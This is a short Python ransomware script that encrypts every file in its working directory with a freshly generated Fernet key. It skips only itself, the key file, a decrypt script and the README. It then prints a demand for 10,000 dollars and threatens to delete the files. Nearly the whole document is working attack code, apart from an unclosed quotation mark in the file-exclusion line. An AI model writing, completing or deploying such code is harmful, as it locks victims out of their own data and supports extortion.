#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#lets find some files


files = []

for file in os.listdir():
	if file == "randsomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "README.md:
		continue
	if os.path.isfile(file):
		files.append(file)


print(files)


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open (file, "wb") as thefile:
		thefile.write(contents_encrypted)


print("all your files are worth nothing now but IF you wire me 10,000 dollars i will restore them AND IF YOU DONT I WILL DELETE THEM")
